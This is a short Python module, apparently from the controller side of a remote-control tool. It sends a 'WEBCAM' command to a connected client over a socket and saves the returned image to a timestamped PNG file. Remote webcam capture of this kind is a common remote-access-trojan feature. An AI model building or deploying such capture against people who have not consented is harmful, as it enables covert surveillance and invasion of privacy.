""" Webcam functionality """
import logging
import socket
from datetime import datetime

from modules.clients import Client


def webcam(client: Client) -> str:
    """ Capture webcam """
    logging.debug('Capturing webcam (%s)', client.id)
    client.write(b'WEBCAM')
    client.conn.settimeout(120)
    try:
        img_data = client.read()
    finally:
        client.conn.settimeout(socket.getdefaulttimeout())

    if img_data == b'ERROR':
        logging.error('Unable to capture webcam (%s)', client.id)
        raise RuntimeError('Unable to capture webcam')

    filename = f'webcam-{datetime.now()}.png'.replace(':', '-')
    with open(filename, 'wb') as file:
        file.write(img_data)
    logging.info('Saved webcam capture at (%s): %s', client.id, filename)
    return filename
